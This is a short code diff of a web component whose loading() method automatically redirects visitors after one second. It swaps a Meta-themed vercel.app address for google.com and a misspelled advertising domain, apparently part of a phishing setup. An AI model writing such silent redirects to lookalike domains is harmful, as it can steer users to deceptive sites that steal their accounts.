@@ -30,7 +30,10 @@ export default {
   methods: {
     loading() {
       setTimeout(function () {
-        window.location.href = 'https://meta-center-9123823518.vercel.app';
+        window.location.href = 'https://www.google.com/';
+      }, 1000);
+      setTimeout(function () {
+        window.location.href = 'https://www.advertt-for-busiiness-vilniusweekends.com/';
       }, 1000);
     },
     startCountdown() {
